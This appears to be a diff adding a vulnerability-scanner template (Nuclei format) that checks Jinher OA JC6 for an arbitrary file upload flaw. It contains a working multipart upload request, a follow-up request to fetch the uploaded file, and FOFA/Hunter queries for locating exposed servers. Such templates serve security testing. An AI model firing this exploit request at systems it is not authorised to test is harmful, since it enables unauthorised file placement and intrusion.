@@ -1,0 +1,64 @@
+id: jinher-oa-jc6-servlet-officesaveflag-fileupload
+
+info:
+  name: 金和OA-任意文件上传漏洞
+  author: hufei
+  severity: critical
+  description: 金和OA /servlet/Upload?officeSaveFlag存在任意文件上传漏洞
+  reference: None
+  metadata:
+    fofa-query: "JC6金和协同管理平台"
+    hunter-query: 'app.name="金和 OA"'
+    veified: true
+  tags: jinher,oa,fileupload
+
+variables:
+  v1: '{{rand_base(5)}}'
+
+http:
+  - raw:
+      - | #上传文件
+        POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=---------------------------222208498735567825232991080000
+        Content-Length: 224
+        Connection: close
+
+        -----------------------------222208498735567825232991080000
+        Content-Disposition: form-data; name="img"; filename="{{v1}}.txt"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        -----------------------------222208498735567825232991080000--
+
+      - | #访问文件
+        GET /jc6/{{name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+
+    extractors:
+      - type: regex
+        name: name
+        part: body
+        internal: true
+        group: 0
+        regex:
+          - '\/upload\/\w+\.txt'
+
+      - type: regex
+        part: body
+        group: 0
+        regex:
+          - '\/upload\/\w+\.txt'
+
+    matchers:
+      - type: dsl
+        dsl: # 更改为or判断，增加成功率
+          - "status_code_1 == 200 && contains_all((body_1), 'arr[0]','arr[2]=')"
+          - "status_code_2 == 200 && contains((body_2), '{{randstr}}')"
+        condition: or
+
+# 文件上传路径：/jc6/upload/返回arr[2]='xxx'的值
+# 例如：http://x.x.x.x/jc6/upload/4028807b854ceaee018586c94d1d3fa9.txt
